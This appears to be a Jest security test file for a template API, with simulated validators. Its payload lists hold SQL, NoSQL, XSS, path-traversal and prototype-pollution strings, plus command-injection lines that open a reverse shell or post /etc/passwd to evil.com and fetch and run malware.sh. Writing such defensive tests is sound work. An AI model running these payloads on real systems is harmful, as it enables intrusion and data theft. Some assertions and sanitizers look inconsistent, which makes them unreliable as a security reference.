/**
 * Input Validation Security Tests
 * 
 * These tests verify proper input validation and sanitization to prevent
 * injection attacks, XSS, and other input-based security vulnerabilities.
 */

describe('Input Validation Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('SQL Injection Prevention', () => {
    it('should reject SQL injection attempts in search queries', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE templates; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO templates VALUES ('malicious'); --",
        "' OR 1=1 LIMIT 1 OFFSET 1 --",
        "admin'--",
        "admin'/*",
        "' or 1=1#",
        "' or 1=1--",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--"
      ];

      for (const payload of sqlInjectionPayloads) {
        const event = {
          httpMethod: 'GET',
          path: '/templates',
          queryStringParameters: { search: payload }
        };

        const result = await simulateSearchRequest(event);
        
        // Should not return raw SQL or error messages
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain('Invalid search query');
        expect(result.body).not.toContain('SQL');
        expect(result.body).not.toContain('SELECT');
        expect(result.body).not.toContain('DROP');
      }
    });

    it('should sanitize template content for database operations', async () => {
      const maliciousContent = [
        "'; DELETE FROM templates WHERE '1'='1",
        "{{variable}}'; DROP TABLE users; --",
        "Content with '; malicious SQL; --",
        "Template'; UPDATE templates SET title='hacked' WHERE '1'='1; --"
      ];

      for (const content of maliciousContent) {
        const event = {
          httpMethod: 'POST',
          path: '/templates',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: JSON.stringify({
            title: 'Test Template',
            content: content,
            tags: ['test'],
            visibility: 'public'
          })
        };

        const result = await simulateTemplateCreation(event);
        
        // Should sanitize or reject dangerous content
        if (result.statusCode === 201) {
          const savedTemplate = JSON.parse(result.body).template;
          expect(savedTemplate.content).not.toContain('DELETE');
          expect(savedTemplate.content).not.toContain('DROP');
          expect(savedTemplate.content).not.toContain('UPDATE');
        } else {
          expect(result.statusCode).toBe(400);
          expect(result.body).toContain('Invalid content');
        }
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should prevent NoSQL injection in DynamoDB operations', async () => {
      const noSqlInjectionPayloads = [
        { $ne: null },
        { $exists: true },
        { $where: "function() { return true; }" },
        { $regex: ".*" },
        { templateId: { $ne: null } },
        { title: { $regex: ".*admin.*" } },
        JSON.stringify({ $ne: null }),
        "{ $where: 'this.title.length > 0' }"
      ];

      for (const payload of noSqlInjectionPayloads) {
        const event = {
          httpMethod: 'GET',
          path: '/templates',
          queryStringParameters: { filter: JSON.stringify(payload) }
        };

        const result = await simulateFilteredSearch(event);
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain('Invalid filter');
      }
    });

    it('should validate template ID format', async () => {
      const invalidTemplateIds = [
        { $ne: null },
        "'; DROP TABLE templates; --",
        "../../../etc/passwd",
        "template-id'; malicious",
        JSON.stringify({ $exists: true }),
        "template\x00id",
        "template<script>alert('xss')</script>",
        "template" + "A".repeat(1000) // Very long ID
      ];

      for (const templateId of invalidTemplateIds) {
        const event = {
          httpMethod: 'GET',
          path: `/templates/${templateId}`,
          pathParameters: { id: templateId }
        };

        const result = await simulateTemplateGet(event);
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain('Invalid template ID');
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize template titles to prevent XSS', async () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "<script>fetch('/api/admin/users').then(r=>r.json()).then(console.log)</script>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
        "\"><script>alert('XSS')</script>",
        "'+alert('XSS')+'",
        "<details ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>"
      ];

      for (const payload of xssPayloads) {
        const event = {
          httpMethod: 'POST',
          path: '/templates',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: JSON.stringify({
            title: payload,
            content: 'Safe content',
            tags: ['test'],
            visibility: 'public'
          })
        };

        const result = await simulateTemplateCreation(event);
        
        if (result.statusCode === 201) {
          const savedTemplate = JSON.parse(result.body).template;
          
          // Title should be sanitized
          expect(savedTemplate.title).not.toContain('<script>');
          expect(savedTemplate.title).not.toContain('javascript:');
          expect(savedTemplate.title).not.toContain('onerror=');
          expect(savedTemplate.title).not.toContain('onload=');
          expect(savedTemplate.title).not.toContain('alert(');
        } else {
          expect(result.statusCode).toBe(400);
        }
      }
    });

    it('should sanitize template content while preserving variables', async () => {
      const mixedContent = [
        "Hello {{name}}, <script>alert('XSS')</script> welcome to {{company}}!",
        "Dear {{user}}, <img src=x onerror=alert('hack')> your order is ready.",
        "{{greeting}} <iframe src='javascript:alert(1)'></iframe> {{message}}",
        "Safe {{variable}} content <svg onload=alert('xss')> more content"
      ];

      for (const content of mixedContent) {
        const event = {
          httpMethod: 'POST',
          path: '/templates',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: JSON.stringify({
            title: 'Test Template',
            content: content,
            tags: ['test'],
            visibility: 'public'
          })
        };

        const result = await simulateTemplateCreation(event);
        
        if (result.statusCode === 201) {
          const savedTemplate = JSON.parse(result.body).template;
          
          // Variables should be preserved
          expect(savedTemplate.content).toContain('{{');
          expect(savedTemplate.content).toContain('}}');
          
          // XSS should be removed
          expect(savedTemplate.content).not.toContain('<script>');
          expect(savedTemplate.content).not.toContain('javascript:');
          expect(savedTemplate.content).not.toContain('onerror=');
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in file operations', async () => {
      const commandInjectionPayloads = [
        "; cat /etc/passwd",
        "| whoami",
        "&& rm -rf /",
        "; ping evil.com",
        "$(curl evil.com)",
        "`cat /etc/hosts`",
        "; nc -e /bin/sh evil.com 4444",
        "| curl -X POST -d @/etc/passwd evil.com",
        "; wget evil.com/malware.sh -O /tmp/malware.sh; chmod +x /tmp/malware.sh; /tmp/malware.sh"
      ];

      for (const payload of commandInjectionPayloads) {
        const event = {
          httpMethod: 'POST',
          path: '/templates/export',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: JSON.stringify({
            templateId: 'template-123',
            format: 'csv',
            filename: `export${payload}.csv`
          })
        };

        const result = await simulateExportOperation(event);
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain('Invalid filename');
      }
    });

    it('should validate email addresses for sharing', async () => {
      const maliciousEmails = [
        "user@example.com; cat /etc/passwd",
        "user@example.com | whoami",
        "user@example.com && malicious-command",
        "$(command)@example.com",
        "`command`@example.com",
        "user@example.com\nBcc: evil@hacker.com",
        "user@example.com\r\nSubject: Hacked",
        "user@$(whoami).com"
      ];

      for (const email of maliciousEmails) {
        const event = {
          httpMethod: 'POST',
          path: '/templates/template-123/share',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: JSON.stringify({
            email: email,
            message: 'Check out this template'
          })
        };

        const result = await simulateTemplateShare(event);
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain('Invalid email');
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal in template IDs', async () => {
      const pathTraversalPayloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/var/www/../../etc/passwd",
        "template-id/../../../secret.txt",
        "template-id\\..\\..\\..\\secret.txt"
      ];

      for (const payload of pathTraversalPayloads) {
        const event = {
          httpMethod: 'GET',
          path: `/templates/${payload}`,
          pathParameters: { id: payload }
        };

        const result = await simulateTemplateGet(event);
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain('Invalid template ID');
      }
    });

    it('should prevent path traversal in file uploads', async () => {
      const maliciousPaths = [
        "../../../uploads/malware.exe",
        "..\\..\\..\\uploads\\virus.bat",
        "/etc/passwd",
        "C:\\Windows\\System32\\cmd.exe",
        "template/../../../config/database.json",
        "uploads/../../secret/.env"
      ];

      for (const path of maliciousPaths) {
        const event = {
          httpMethod: 'POST',
          path: '/uploads',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: JSON.stringify({
            filename: path,
            content: 'malicious content'
          })
        };

        const result = await simulateFileUpload(event);
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain('Invalid file path');
      }
    });
  });

  describe('Input Size and Format Validation', () => {
    it('should enforce input size limits', async () => {
      const oversizedInputs = {
        title: 'A'.repeat(1001), // Assuming 1000 char limit
        content: 'B'.repeat(100001), // Assuming 100KB limit
        tags: Array.from({ length: 101 }, (_, i) => `tag${i}`), // Assuming 100 tag limit
        email: 'user@' + 'a'.repeat(250) + '.com' // Very long email
      };

      for (const [field, value] of Object.entries(oversizedInputs)) {
        const templateData = {
          title: 'Test Template',
          content: 'Test content',
          tags: ['test'],
          visibility: 'public'
        };
        
        templateData[field] = value;

        const event = {
          httpMethod: 'POST',
          path: '/templates',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: JSON.stringify(templateData)
        };

        const result = await simulateTemplateCreation(event);
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain(`${field} too large`);
      }
    });

    it('should validate data types and formats', async () => {
      const invalidInputs = [
        { title: 123, expectedError: 'Title must be string' },
        { content: null, expectedError: 'Content required' },
        { tags: 'not-an-array', expectedError: 'Tags must be array' },
        { visibility: 'invalid', expectedError: 'Invalid visibility' },
        { variables: 'not-array', expectedError: 'Variables must be array' }
      ];

      for (const input of invalidInputs) {
        const templateData = {
          title: 'Test Template',
          content: 'Test content',
          tags: ['test'],
          visibility: 'public',
          ...input
        };

        const event = {
          httpMethod: 'POST',
          path: '/templates',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: JSON.stringify(templateData)
        };

        const result = await simulateTemplateCreation(event);
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain(input.expectedError);
      }
    });
  });

  describe('Regular Expression DoS Prevention', () => {
    it('should prevent ReDoS attacks in search patterns', async () => {
      const redosPayloads = [
        '(a+)+$',
        '([a-zA-Z]+)*$',
        '(a|a)*$',
        '(a|b)*aaaaa',
        '^(a+)+$',
        '([a-z]*)*$',
        '(.*a){x}',
        '(.+)+$',
        '([^\\s]+(\\s+[^\\s]+)*)*$'
      ];

      for (const payload of redosPayloads) {
        const startTime = Date.now();
        
        const event = {
          httpMethod: 'GET',
          path: '/templates',
          queryStringParameters: { regex: payload }
        };

        const result = await simulateRegexSearch(event);
        const endTime = Date.now();
        
        // Should complete quickly or reject the pattern
        expect(endTime - startTime).toBeLessThan(1000);
        
        if (result.statusCode !== 200) {
          expect(result.statusCode).toBe(400);
          expect(result.body).toContain('Invalid regex pattern');
        }
      }
    });
  });

  describe('JSON Parsing Security', () => {
    it('should handle malformed JSON safely', async () => {
      const malformedJson = [
        '{"title": "test"', // Missing closing brace
        '{"title": "test",}', // Trailing comma
        '{"title": }', // Missing value
        '{title: "test"}', // Unquoted key
        '{"title": "test\x00"}', // Null byte
        '{"__proto__": {"admin": true}}', // Prototype pollution
        '{"constructor": {"prototype": {"admin": true}}}' // Constructor pollution
      ];

      for (const json of malformedJson) {
        const event = {
          httpMethod: 'POST',
          path: '/templates',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: json
        };

        const result = await simulateTemplateCreation(event);
        expect(result.statusCode).toBe(400);
        expect(result.body).toContain('Invalid JSON');
      }
    });

    it('should prevent prototype pollution', async () => {
      const pollutionPayloads = [
        '{"__proto__": {"polluted": true}}',
        '{"constructor": {"prototype": {"polluted": true}}}',
        '{"prototype": {"polluted": true}}',
        JSON.stringify({
          "__proto__": { "admin": true },
          "title": "Normal Template"
        })
      ];

      for (const payload of pollutionPayloads) {
        const event = {
          httpMethod: 'POST',
          path: '/templates',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: payload
        };

        const result = await simulateTemplateCreation(event);
        
        // Should not pollute prototype
        expect({}.polluted).toBeUndefined();
        expect({}.admin).toBeUndefined();
        
        // Should reject or sanitize the request
        if (result.statusCode === 201) {
          const template = JSON.parse(result.body).template;
          expect(template.__proto__).toBeUndefined();
          expect(template.constructor).toBeUndefined();
        }
      }
    });
  });
});

// Helper functions for input validation testing
async function simulateSearchRequest(event) {
  const searchTerm = event.queryStringParameters?.search;
  
  if (!searchTerm || typeof searchTerm !== 'string') {
    return { statusCode: 400, body: 'Search term required' };
  }
  
  // SQL injection detection
  const sqlPatterns = [
    /'/gi,
    /;/gi,
    /--/gi,
    /\/\*/gi,
    /\*\//gi,
    /union/gi,
    /select/gi,
    /drop/gi,
    /delete/gi,
    /insert/gi,
    /update/gi,
    /or\s+1\s*=\s*1/gi
  ];
  
  for (const pattern of sqlPatterns) {
    if (pattern.test(searchTerm)) {
      return { statusCode: 400, body: 'Invalid search query detected' };
    }
  }
  
  return { statusCode: 200, body: 'Search completed' };
}

async function simulateTemplateCreation(event) {
  try {
    const data = JSON.parse(event.body);
    
    // Size validation
    if (data.title && data.title.length > 1000) {
      return { statusCode: 400, body: 'title too large' };
    }
    
    if (data.content && data.content.length > 100000) {
      return { statusCode: 400, body: 'content too large' };
    }
    
    if (data.tags && Array.isArray(data.tags) && data.tags.length > 100) {
      return { statusCode: 400, body: 'tags too large' };
    }
    
    // Type validation
    if (data.title && typeof data.title !== 'string') {
      return { statusCode: 400, body: 'Title must be string' };
    }
    
    if (!data.content) {
      return { statusCode: 400, body: 'Content required' };
    }
    
    if (data.tags && !Array.isArray(data.tags)) {
      return { statusCode: 400, body: 'Tags must be array' };
    }
    
    if (data.visibility && !['public', 'private'].includes(data.visibility)) {
      return { statusCode: 400, body: 'Invalid visibility' };
    }
    
    if (data.variables && !Array.isArray(data.variables)) {
      return { statusCode: 400, body: 'Variables must be array' };
    }
    
    // XSS sanitization
    if (data.title) {
      data.title = sanitizeHtml(data.title);
    }
    
    if (data.content) {
      data.content = sanitizeHtmlButPreserveVariables(data.content);
    }
    
    // Check for dangerous SQL patterns in content
    const dangerousPatterns = ['DELETE', 'DROP', 'UPDATE', 'INSERT'];
    for (const pattern of dangerousPatterns) {
      if (data.content.toUpperCase().includes(pattern)) {
        return { statusCode: 400, body: 'Invalid content detected' };
      }
    }
    
    return {
      statusCode: 201,
      body: JSON.stringify({
        template: {
          templateId: 'template-123',
          ...data
        }
      })
    };
  } catch (error) {
    return { statusCode: 400, body: 'Invalid JSON format' };
  }
}

async function simulateFilteredSearch(event) {
  const filter = event.queryStringParameters?.filter;
  
  if (!filter) {
    return { statusCode: 200, body: 'No filter applied' };
  }
  
  try {
    const parsedFilter = JSON.parse(filter);
    
    // Check for NoSQL injection patterns
    const dangerousKeys = ['$ne', '$exists', '$where', '$regex', '$gt', '$lt', '$in', '$nin'];
    
    function containsDangerousKeys(obj) {
      if (typeof obj !== 'object' || obj === null) return false;
      
      for (const key of Object.keys(obj)) {
        if (dangerousKeys.includes(key)) return true;
        if (typeof obj[key] === 'object' && containsDangerousKeys(obj[key])) return true;
      }
      return false;
    }
    
    if (containsDangerousKeys(parsedFilter)) {
      return { statusCode: 400, body: 'Invalid filter operators detected' };
    }
    
    return { statusCode: 200, body: 'Filter applied' };
  } catch (error) {
    return { statusCode: 400, body: 'Invalid filter format' };
  }
}

async function simulateTemplateGet(event) {
  const templateId = event.pathParameters?.id;
  
  if (!templateId || typeof templateId !== 'string') {
    return { statusCode: 400, body: 'Template ID required' };
  }
  
  // Path traversal detection
  if (templateId.includes('..') || templateId.includes('/') || templateId.includes('\\')) {
    return { statusCode: 400, body: 'Invalid template ID format' };
  }
  
  // XSS detection in ID
  if (templateId.includes('<') || templateId.includes('>') || templateId.includes('script')) {
    return { statusCode: 400, body: 'Invalid template ID format' };
  }
  
  // Size limit
  if (templateId.length > 100) {
    return { statusCode: 400, body: 'Template ID too long' };
  }
  
  // Valid format (alphanumeric, hyphens, underscores only)
  if (!/^[a-zA-Z0-9_-]+$/.test(templateId)) {
    return { statusCode: 400, body: 'Invalid template ID format' };
  }
  
  return { statusCode: 200, body: 'Template found' };
}

async function simulateExportOperation(event) {
  const data = JSON.parse(event.body);
  const filename = data.filename;
  
  if (!filename || typeof filename !== 'string') {
    return { statusCode: 400, body: 'Filename required' };
  }
  
  // Command injection detection
  const dangerousChars = [';', '|', '&', '$', '`', '(', ')', '<', '>'];
  for (const char of dangerousChars) {
    if (filename.includes(char)) {
      return { statusCode: 400, body: 'Invalid filename characters' };
    }
  }
  
  // Path traversal detection
  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
    return { statusCode: 400, body: 'Invalid filename path' };
  }
  
  return { statusCode: 200, body: 'Export started' };
}

async function simulateTemplateShare(event) {
  const data = JSON.parse(event.body);
  const email = data.email;
  
  if (!email || typeof email !== 'string') {
    return { statusCode: 400, body: 'Email required' };
  }
  
  // Command injection detection
  const dangerousChars = [';', '|', '&', '$', '`', '\n', '\r'];
  for (const char of dangerousChars) {
    if (email.includes(char)) {
      return { statusCode: 400, body: 'Invalid email format' };
    }
  }
  
  // Basic email validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return { statusCode: 400, body: 'Invalid email format' };
  }
  
  return { statusCode: 200, body: 'Share sent' };
}

async function simulateFileUpload(event) {
  const data = JSON.parse(event.body);
  const filename = data.filename;
  
  if (!filename || typeof filename !== 'string') {
    return { statusCode: 400, body: 'Filename required' };
  }
  
  // Path traversal detection
  if (filename.includes('..') || filename.startsWith('/') || filename.includes('\\')) {
    return { statusCode: 400, body: 'Invalid file path detected' };
  }
  
  return { statusCode: 200, body: 'File uploaded' };
}

async function simulateRegexSearch(event) {
  const regex = event.queryStringParameters?.regex;
  
  if (!regex) {
    return { statusCode: 200, body: 'No regex provided' };
  }
  
  // ReDoS protection - check for dangerous patterns
  const dangerousPatterns = [
    /\(\.\*\+\)\+/,    // (.*+)+
    /\(\.\+\)\+/,      // (.+)+
    /\(\w\+\)\+/,      // (\w+)+
    /\(\w\*\)\*/,      // (\w*)*
    /\(\.\*\)\*/       // (.*)*
  ];
  
  for (const pattern of dangerousPatterns) {
    if (pattern.test(regex)) {
      return { statusCode: 400, body: 'Invalid regex pattern - potential ReDoS' };
    }
  }
  
  // Complexity limit
  if (regex.length > 100) {
    return { statusCode: 400, body: 'Regex pattern too complex' };
  }
  
  return { statusCode: 200, body: 'Regex search completed' };
}

function sanitizeHtml(input) {
  if (typeof input !== 'string') return input;
  
  return input
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

function sanitizeHtmlButPreserveVariables(input) {
  if (typeof input !== 'string') return input;
  
  // Preserve template variables {{variable}}
  const variables = [];
  let variableIndex = 0;
  
  // Extract variables
  const withPlaceholders = input.replace(/\{\{[^}]+\}\}/g, (match) => {
    variables.push(match);
    return `__VARIABLE_${variableIndex++}__`;
  });
  
  // Sanitize HTML
  const sanitized = sanitizeHtml(withPlaceholders);
  
  // Restore variables
  return sanitized.replace(/__VARIABLE_(\d+)__/g, (match, index) => {
    return variables[parseInt(index)] || match;
  });
}